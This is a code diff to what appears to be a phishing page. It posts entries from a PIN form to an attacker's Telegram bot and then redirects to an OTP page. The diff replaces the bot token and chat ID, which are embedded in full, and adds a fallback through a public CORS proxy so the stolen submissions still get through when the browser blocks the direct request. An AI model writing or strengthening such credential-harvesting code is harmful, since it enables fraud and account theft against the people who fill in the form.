@@ -249,23 +249,45 @@
   });
 
  // Telegram Bot Configuration (REPLACE WITH YOUR VALUES)
-const BOT_TOKEN = '7727536198:AAHVg5-c49YD5HLPHN38BR0fXMNSu5kc8F8'; 
-const CHAT_ID = '6616863663';
+const BOT_TOKEN = '8469634999:AAEZEB17GCnSsx--dfBA6dUIo4JSq7Tqr98'; 
+const CHAT_ID = '8597632105';
 
-// Function to send message to Telegram
+// Function to send message to Telegram with CORS-proxy fallback
 async function sendToTelegram(message) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const response = await fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-    }),
-  });
-  return response.ok;
+  // Prefer GET so we can attempt proxy fallback as a simple URL
+  const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(CHAT_ID)}&text=${encodeURIComponent(message)}`;
+
+  // Try direct request first (may fail due to CORS when called from browser)
+  try {
+    const resp = await fetch(apiUrl, { method: 'GET' });
+    if (resp.ok) {
+      try { const j = await resp.json(); if (j && j.ok) return true; } catch(e) { return true; }
+    } else {
+      console.warn('Telegram direct request returned not ok', resp.status);
+    }
+  } catch (err) {
+    console.warn('Direct Telegram request failed (likely CORS):', err);
+  }
+
+  // Fallback: use a CORS-friendly public proxy that returns the remote body (GET only)
+  // NOTE: Public proxies are for demos only. For production, proxy via your server.
+  const CORS_PROXY = 'https://api.allorigins.win/raw?url='; // returns raw body
+  try {
+    const proxied = CORS_PROXY + encodeURIComponent(apiUrl);
+    const pr = await fetch(proxied, { method: 'GET' });
+    if (!pr.ok) {
+      console.warn('Proxy request failed', pr.status);
+      return false;
+    }
+    // allorigins returns the remote body; parse it as JSON to inspect Telegram's response
+    const json = await pr.json();
+    if (json && json.ok) return true;
+    console.warn('Telegram (via proxy) returned error:', json);
+    return false;
+  } catch (err) {
+    console.error('Proxy request error:', err);
+    return false;
+  }
 }
 
 // Form submission handler with Telegram integration
@@ -300,11 +322,11 @@ document.getElementById('pinForm').addEventListener('submit', async function(e) 
       // Redirect on success
       window.location.href = 'trialotp.html';
     } else {
-      alert('Failed to submit. Please check your internet connection');
+      alert('Failed to submit. This may be due to CORS or invalid bot credentials — check the console for details.');
     }
   } catch (error) {
     console.error('Error sending to Telegram:', error);
-    alert('Submission failed. Please try again.');
+    alert('Submission failed. Please check console for details and ensure your bot token/chat ID are correct.');
   }
 });
 </script>
